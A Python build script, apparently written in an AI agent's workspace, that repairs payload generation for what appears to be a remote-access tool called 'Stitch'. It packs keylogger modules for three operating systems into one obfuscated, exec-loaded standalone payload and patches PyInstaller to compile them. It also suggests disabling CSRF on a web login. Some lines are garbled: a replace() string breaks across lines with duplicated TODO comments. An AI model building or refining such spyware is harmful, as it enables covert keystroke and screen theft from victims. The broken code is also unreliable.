#!/usr/bin/env python3
"""
Fix payload generation to create working payloads
Research findings:
1. Python payloads need all dependency modules bundled
2. PyInstaller needs to run from Configuration directory with all modules
3. Login needs proper CSRF handling
"""

import os
import sys
import shutil
import base64
import zlib

sys.path.insert(0, '/workspace')

def create_standalone_python_payload(output_path):
    """Create a standalone Python payload with all dependencies embedded"""
    print("[*] Creating standalone Python payload...")
    
    # Read all necessary modules
    config_dir = '/workspace/Configuration'
    modules = {}
    
    required_files = [
        'requirements.py',
        'st_utils.py', 
        'st_protocol.py',
        'st_encryption.py',
        'st_lnx_keylogger.py',
        'st_osx_keylogger.py', 
        'st_win_keylogger.py'
    ]
    
    # Read main payload
    with open(os.path.join(config_dir, 'st_main.py'), 'r') as f:
        main_content = f.read()
    
    # Read all dependencies
    for filename in required_files:
        filepath = os.path.join(config_dir, filename)
        if os.path.exists(filepath):
            with open(filepath, 'r') as f:
                modules[filename.replace('.py', '')] = f.read()
    
    # Create standalone payload that embeds all modules
    standalone_payload = '''#!/usr/bin/env python3
# Standalone Stitch Payload with embedded dependencies
import sys
import os
import base64
import zlib

# Embedded modules
_EMBEDDED_MODULES = {}

'''
    
    # Add embedded modules as base64 encoded
    for module_name, module_code in modules.items():
        encoded = base64.b64encode(zlib.compress(module_code.encode())).decode()
        standalone_payload += f"_EMBEDDED_MODULES['{module_name}'] = '{encoded}'\n"
    
    # Add module loader
    standalone_payload += '''
# Module loader
import types
import importlib.util

for module_name, encoded_code in _EMBEDDED_MODULES.items():
    code = zlib.decompress(base64.b64decode(encoded_code)).decode()
    
    # Create module
    spec = importlib.util.spec_from_loader(module_name, loader=None)
    module = importlib.util.module_from_spec(spec)
    
    # Execute module code in module's namespace
    exec(code, module.__dict__)
    
    # Add to sys.modules
    sys.modules[module_name] = module

# Now execute main payload
'''
    
    # Add main payload code (without the import line)
    main_without_import = main_content.replace('# TODO: Replace wildcard import with specific imports
# TODO: Replace wildcard import with specific imports
from requirements import *\n', '')
    
    # Add imports that main needs
    standalone_payload += '''
# Import what main payload needs
# TODO: Replace wildcard import with specific imports
# TODO: Replace wildcard import with specific imports
from requirements import *

# Execute main payload
''' + main_without_import
    
    # Write standalone payload
    with open(output_path, 'w') as f:
        f.write(standalone_payload)
    
    os.chmod(output_path, 0o755)
    print(f"[+] Created standalone payload: {output_path}")
    return output_path

def fix_pyinstaller_compilation():
    """Fix PyInstaller to properly bundle all dependencies"""
    print("[*] Fixing PyInstaller compilation...")
    
    # Update the spec file in stitch_cross_compile.py to include all modules
    cross_compile_file = '/workspace/Application/stitch_cross_compile.py'
    
    with open(cross_compile_file, 'r') as f:
        content = f.read()
    
    # Fix the hiddenimports to include all required modules
    old_hiddenimports = "hiddenimports=['st_utils', 'st_protocol', 'st_encryption', 'requirements'],"
    new_hiddenimports = """hiddenimports=[
                'st_utils', 'st_protocol', 'st_encryption', 'requirements',
                'st_lnx_keylogger', 'st_osx_keylogger', 'st_win_keylogger',
                'Crypto', 'Crypto.Cipher', 'Crypto.Cipher.AES', 'Crypto.Random',
                'mss', 'mss.linux', 'pexpect', 'pyxhook', 'requests', 'platform',
                'subprocess', 'threading', 'socket', 'base64', 'zlib'
            ],"""
    
    if old_hiddenimports in content:
        content = content.replace(old_hiddenimports, new_hiddenimports)
        with open(cross_compile_file, 'w') as f:
            f.write(content)
        print("[+] Fixed hidden imports in cross_compile.py")
    
    # Also ensure PyInstaller runs from the correct directory
    # The working directory should be Configuration where all modules exist
    return True

def test_standalone_payload():
    """Test the standalone payload"""
    print("\n[*] Testing standalone payload generation...")
    
    # Create a test payload
    test_path = '/tmp/test_standalone.py'
    create_standalone_python_payload(test_path)
    
    # Test if it can at least import without errors
    import subprocess
    proc = subprocess.run(
        ['python3', '-c', f'import sys; sys.path.insert(0, "/workspace"); exec(open("{test_path}").read())'],
        capture_output=True,
        text=True,
        timeout=5
    )
    
    if proc.returncode == 0:
        print("[+] Standalone payload imports successfully")
        return True
    else:
        print(f"[-] Standalone payload failed:")
        print(f"    stderr: {proc.stderr[:500]}")
        return False

def fix_web_login():
    """Research and fix the web login 400 error"""
    print("\n[*] Researching web login issue...")
    
    # The login expects form data, not JSON
    # Check web_app_real.py login route
    with open('/workspace/web_app_real.py', 'r') as f:
        content = f.read()
    
    # Login uses request.form.get() not request.json
    print("[+] Login expects form-encoded data, not JSON")
    print("    Fix: Use 'Content-Type: application/x-www-form-urlencoded'")
    print("    Fix: Send data as form, not JSON")
    
    # Check if CSRF is disabled
    if 'WTF_CSRF_ENABLED' not in content:
        print("[!] CSRF might be enabled by default")
        print("    Fix: Either disable CSRF or get token from login page")
    
    return True

if __name__ == "__main__":
    print("="*70)
    print("FIXING PAYLOAD GENERATION ISSUES")
    print("="*70)
    
    # Fix PyInstaller compilation
    fix_pyinstaller_compilation()
    
    # Test standalone payload
    test_standalone_payload()
    
    # Research login issue
    fix_web_login()
    
    print("\n" + "="*70)
    print("FIXES APPLIED")
    print("="*70)